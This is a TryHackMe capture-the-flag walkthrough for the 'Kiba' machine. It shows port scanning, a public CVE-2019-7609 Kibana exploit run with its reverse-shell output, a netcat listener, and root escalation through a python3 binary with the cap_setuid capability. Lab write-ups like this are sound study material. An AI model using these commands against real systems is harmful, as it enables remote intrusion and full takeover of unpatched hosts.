---
title: Kiba
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Kiba machine
  on TryHackMe.
slug: kiba
---





> Using nmap found

```
PORT     STATE SERVICE     REASON
22/tcp   open  ssh         syn-ack ttl 63
80/tcp   open  http        syn-ack ttl 63
5044/tcp open  lxi-evntsvc syn-ack ttl 63
5601/tcp open  esmagent    syn-ack ttl 63
```

> so in target:5601 has kibana dashborad

> Using this https://github.com/LandGrey/CVE-2019-7609.git repo

```
❯ python2 exploit.py -u http://10.201.55.184:5601/ -host 10.21.16.42 -port 4444 --shell
[+] http://10.201.55.184:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
[+] reverse shell completely! please check session on: 10.21.16.42:4444


```

> Finally get reverse shell

```
❯ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.21.16.42] from (UNKNOWN) [10.201.55.184] 45634
bash: cannot set terminal process group (961): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kiba@ubuntu:/home/kiba/kibana/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<na/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'                     
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

```

> after using this command find

```
getcap -r / 2>/dev/null

```

> To check what capabilities are already existing on the victim machine, type: **_getcap -r /_** **_2>/dev/null_**. I again added the 2>/dev/null to weed the permission errors from showing up as part of the search results:

```
kiba@ubuntu:/home/kiba$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

> to exploit the file with capabilities and change user kiba’s UID to root.

```
./python3 -c ‘import os; os.setuid(0); os.system(“/bin/bash”)’


kiba@ubuntu:/home/kiba$ /home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
<on3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

```

> To find root flag

```
find / -name root.txt 2>/dev/null

```

